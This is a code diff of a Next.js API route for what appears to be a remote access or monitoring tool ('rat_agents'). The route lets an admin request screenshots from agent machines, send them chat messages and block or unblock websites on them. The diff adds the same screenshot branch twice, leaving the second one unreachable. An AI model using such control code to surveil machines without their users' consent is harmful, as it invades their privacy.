@@ -94,7 +94,24 @@ export async function POST(
       return NextResponse.json({ error: 'Command type required' }, { status: 400 })
     }
 
-    // FIX: persist admin messages to rat_messages immediately so they show in chat history
+    // FIX: screenshot uses a flag, not the command queue — prevents it firing on every heartbeat
+    if (type === 'screenshot') {
+      await sql`UPDATE rat_agents SET screenshot_requested = TRUE WHERE id = ${agentId}`
+      return NextResponse.json({ success: true, command_id: 'screenshot_flag', message: 'Screenshot requested' })
+    }
+
+    // FIX: screenshots use a flag on rat_agents rather than a command row.
+    // This guarantees exactly one capture per button press — no stale unacked
+    // rows in rat_commands can ever cause repeated auto-screenshotting.
+    if (type === 'screenshot') {
+      await sql`
+        UPDATE rat_agents SET screenshot_requested = TRUE WHERE id = ${agentId}
+      `
+      return NextResponse.json({ success: true, command_id: null, message: 'Screenshot requested' })
+    }
+
+    // FIX: persist admin messages to rat_messages immediately so they appear
+    // in the chat history without waiting for the client to reply.
     if (type === 'message' && payload?.body) {
       await sql`
         INSERT INTO rat_messages (agent_id, sender, body, created_at)
@@ -102,7 +119,8 @@ export async function POST(
       `
     }
 
-    // FIX: persist block_sites to rat_blocked_sites immediately so the list updates in the UI
+    // FIX: persist block/unblock immediately so the UI updates without waiting
+    // for the client heartbeat to round-trip.
     if (type === 'block_sites' && Array.isArray(payload?.domains)) {
       for (const domain of payload.domains as string[]) {
         if (domain) await sql`
@@ -113,7 +131,6 @@ export async function POST(
       }
     }
 
-    // FIX: persist unblock_sites to rat_blocked_sites immediately
     if (type === 'unblock_sites' && Array.isArray(payload?.domains)) {
       const domains = payload.domains as string[]
       if (domains.length > 0) {
